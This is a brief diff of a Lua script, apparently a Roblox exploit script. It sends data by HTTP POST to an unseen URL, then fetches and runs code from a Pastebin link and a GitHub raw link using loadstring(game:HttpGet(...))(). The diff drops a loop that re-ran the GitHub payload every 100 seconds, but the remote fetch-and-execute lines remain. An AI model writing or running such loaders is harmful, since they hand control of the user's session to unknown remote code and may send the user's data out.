@@ -62,8 +62,5 @@ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
 loadstring(game:HttpGet('https://pastebin.com/raw/Ycyen8AM'))()
- 
-while true do
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/PickleIsDaBest/EmojiMain/main/Script'))()
-    wait(100) 
-end
